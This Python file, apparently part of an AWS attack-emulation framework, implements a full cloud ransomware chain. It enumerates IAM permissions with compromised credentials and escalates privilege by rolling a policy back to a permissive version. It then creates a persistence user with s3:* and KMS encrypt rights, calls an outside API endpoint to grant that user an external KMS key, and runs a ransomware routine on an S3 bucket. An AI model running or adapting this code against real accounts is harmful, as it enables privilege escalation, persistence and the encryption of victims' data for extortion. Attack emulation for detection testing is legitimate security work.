import os
import time
from lib.instance_repo import add_to_disk
from lib.iam_enum import IAMEnum
from lib.iam_operations import create_client_with_credentials, create_user, create_access_key, attach_policy_to_user, create_iam_policy
from .s3_ransomware import s3Ransomware
import requests

class Attack:
    def __init__(self, id, aws_region, instance, pathToDisk):
        self.id = id
        self.status = None
        self.step = 0
        self.user_name = instance["resources"]['iam_credentials'][0]['userAccessKey']
        self.user_access_key = instance["resources"]['iam_credentials'][0]['accessKeyId']
        self.user_secret_key = instance["resources"]['iam_credentials'][0]["secretAccessKey"]
        self.instance = instance
        self.filename= os.path.abspath(f"{pathToDisk}/{self.id}.json")
        self.aws_region = aws_region
        self.account_id = instance["resources"]['accounts'][0]
        self.resources = instance['resources']

    def attack(self):
        self.status = 'attack_started'
        try:
            self.step = 1
            iam_enum = IAMEnum(self.user_name, self.user_access_key, self.user_secret_key, self.aws_region)
            iam_enum.noise_enum(self.instance["exchange"], self.instance["logs"])
            self.instance['logs'].append(f"User {self.user_name} enumerated IAM permissions.")
            self._add_to_disk()

            self.step = 2
            self.instance['logs'].append(f"TA reviewed the history of a compromised user's IAM policies and restored the most permissive set of permissions using the SetDefaultPolicyVersion action")
            self._rollback_policy()
            self._add_to_disk()

            self.step = 3
            ransomware_user = f'ransomware-s3@example.com-{self.id}'
            self._create_s3_ransomware_user(ransomware_user)
            self._add_to_disk()
            self._add_ransomware_user_to_extrenal_kms_key(ransomware_user)
            self._add_to_disk()
            
            self.step = 4
            rw_user_access_key = self.instance["resources"]['iam_credentials'][1]['accessKeyId']
            rw_user_secret_key = self.instance["resources"]['iam_credentials'][1]["secretAccessKey"]
            origin_bucket = self.instance["resources"]['buckets'][0]
            s3Ransomware(self.id, rw_user_access_key, rw_user_secret_key, origin_bucket,self.instance["exchange"],self.instance["logs"],self.instance["resources"])
            self.status = 'attack_complete'
            self._add_to_disk()
        except Exception as e:
            self.status = 'attack_failed'
            self.instance['logs'].append(f"Attack failed: {e}")
            print(f"Attack failed: {e}")
            self._add_to_disk()
             
    def _rollback_policy(self):
        client = create_client_with_credentials('iam', self.aws_region, self.user_access_key, self.user_secret_key)
         
        policy_arn = self.instance["resources"]["policies"][0]
        version_id = 'v2'

        response = client.set_default_policy_version(
            PolicyArn=policy_arn,
            VersionId=version_id
        )
        self.instance['exchange'].append({"operation" : "set_default_policy_version", "response": response})
        self.instance["logs"].append(f"Policy version {version_id} for {policy_arn} has been set as the default.")
         
        time.sleep(15)
        
    def _create_s3_ransomware_user(self,ransomware_user):
        client = create_client_with_credentials('iam', self.aws_region, self.user_access_key, self.user_secret_key)

        self.instance["logs"].append(f"Creating user {ransomware_user} to perform ransomware and persistence")
        create_user(client, ransomware_user,self.instance['exchange'], self.instance["logs"],self.instance["resources"])
        create_access_key(client, ransomware_user, self.instance['exchange'], self.instance["logs"],self.instance["resources"])

        policy_document = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Sid": "S3AdminPermissions",
                        "Effect": "Allow",
                        "Action": [
                            "s3:*"
                        ],
                        "Resource": "*"
                    },
                    {
                        "Sid": "KMSEncryptPermission",
                        "Effect": "Allow",
                        "Action": [
                            "kms:Encrypt",
                            "kms:GenerateDataKey"
                        ],
                        "Resource": "*"
                    }
                ]
            }
        policy_arn =  create_iam_policy(client, f"s3-ransomware-with-kms-{self.id}", policy_document, self.instance['exchange'], self.instance["logs"],self.instance["resources"])
        attach_policy_to_user(client, ransomware_user, policy_arn, self.instance['exchange'], self.instance["logs"],self.instance["resources"])
        self.instance["logs"].append(f"Policies attached to {ransomware_user} successfully.")
        time.sleep(15)

    def _add_ransomware_user_to_extrenal_kms_key(self, ransomware_user):
        request_url = f"https://z437pxeg34.execute-api.us-east-1.amazonaws.com/prod/ztiresource?user_name={ransomware_user}&account_id={self.account_id}&operation=create"
        response = requests.get(request_url)
        response_json = response.json()
        status = response_json['status']

        if status == 'failed':
            raise Exception("Failed to aws account to KMS policy")
        elif status == 'done':
            arn_key = response_json['key_id']
            self.resources['kms'] = []
            self.resources['kms'].append(arn_key)

            print(response)
            self.instance['logs'].append(f"Updated key policy to allow external account {ransomware_user} to encrypt.")
        time.sleep(10)

    def _add_to_disk(self):
        add_to_disk(self.filename, self.id, self.status, self.step, self.instance["exchange"],self.instance["logs"],self.instance["resources"])